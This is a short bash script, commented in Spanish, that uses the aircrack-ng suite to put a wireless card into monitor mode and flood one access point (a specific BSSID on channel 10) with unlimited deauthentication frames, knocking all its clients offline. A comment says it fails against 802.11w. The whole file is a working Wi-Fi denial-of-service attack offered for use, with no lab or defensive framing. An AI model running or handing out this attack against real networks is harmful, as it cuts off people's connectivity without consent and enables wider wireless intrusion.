#! /bin/bash
# Desconecta todos los clientes de un AP DDOS
# iwconfig wlan0 down - iwconfig wlan0 mode monitor - iwconfig wlan0 up
# no funciona en: 802.11w
airmon-ng check kill
airmon-ng start wlan1
airodump-ng wlan1mon
airodump-ng wlan1mon --bssid E8:9F:80:13:BB:EC --channel 10
aireplay-ng --deauth 0 -a E8:9F:80:13:BB:EC wlan1mon